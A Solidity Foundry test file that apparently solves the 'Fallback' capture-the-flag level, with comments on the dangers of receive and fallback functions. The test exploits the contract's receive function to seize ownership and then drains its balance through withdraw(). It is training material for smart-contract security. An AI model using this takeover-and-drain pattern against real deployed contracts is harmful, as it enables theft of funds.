// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

/// @custom:win-condition 
/// 1) you claim ownership of the contract
/// 2) you reduce its balance to 0

/// @custom:lesson-learned
/// receive and fallback functions can be dangerous, beware using low level "call" to contracts without an ABI.
/// There may be malicious code in the contracts you're calling (receive and fallback functions) who can then attack your contract

contract FallbackSolvedTest is Test {

  Fallback public s_fallback;
  address payable s_user;
  uint256 s_contributeAmount;
  uint256 s_receiveAmount;

  function setUp() public {
    s_fallback = new Fallback();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
    s_contributeAmount = 0.0000001 ether;
    s_receiveAmount = 0.0000001 ether;
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    // Using the low level "call" method will work but is not recommended, due to security concerns. 
    // (bool c_success, ) = address(s_fallback).call{value: 0.0000001 ether}(abi.encodeWithSignature("contribute()"));

    // Instead use "s_fallback.contribute{value: 0.0000001 ether}();" as done below
    s_fallback.contribute{value: s_contributeAmount}();

    // Using low level "call" is not recommended, but in this case it is the only way to trigger the receive function
    (bool success, ) = address(s_fallback).call{value: s_receiveAmount}("");
    require(success, "fallback failed");

    // assert win condition 1, become the owner
    assertEq(s_fallback.owner(), s_user);

    // assert win condition 2, drain contract balance
    assertEq(address(s_fallback).balance, s_contributeAmount + s_receiveAmount);
    s_fallback.withdraw();
    assertEq(address(s_fallback).balance, 0);
  }
 
}